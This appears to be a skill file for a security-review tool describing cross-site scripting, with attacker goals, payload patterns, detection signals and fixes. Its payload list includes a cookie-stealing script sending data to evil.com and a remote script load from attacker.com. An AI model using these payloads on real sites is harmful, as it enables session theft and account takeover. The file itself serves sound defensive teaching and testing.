---
name: xss
description: Cross-site scripting — reflected, stored, DOM-based. Detection, payloads, fixes.
version: 1.0.0
family: vuln-classes
tools_allowed: [semgrep]
---

# Cross-Site Scripting — CWE-79

## Attacker mindset
The attacker injects a script that runs in the victim's browser under the application's origin.
Goals: steal session cookies, perform actions as the victim, keylog, redirect to phishing.

## Payload patterns
- Basic: `<script>document.location='https://evil.com/?c='+document.cookie</script>`
- Attribute injection: `" onmouseover="alert(1)`
- Without angle brackets: `javascript:alert(1)` in href
- CSP bypass: `<script src="https://attacker.com/x.js"></script>` if CSP allows CDN wildcards

## Detection signals
- `innerHTML`, `outerHTML`, `document.write()` receiving request parameters
- Python: `f"<div>{request.args['q']}</div>"` — raw interpolation into HTML
- Jinja2 with `| safe` filter on user input
- React: `dangerouslySetInnerHTML` with user content

## Fix pattern
- Use framework output encoding: Jinja2 auto-escapes by default — never use `| safe` on user input
- React: use `{userContent}` as text (safe); never `dangerouslySetInnerHTML`
- Node/Express: use `res.json()` for API responses; for HTML use a templating engine with auto-escape
- Content-Security-Policy header as defense in depth: `default-src 'self'`

## Fix validation
Attempt `<script>alert(1)</script>` in the affected input field.
Check that the output is HTML-entity-encoded in the response.
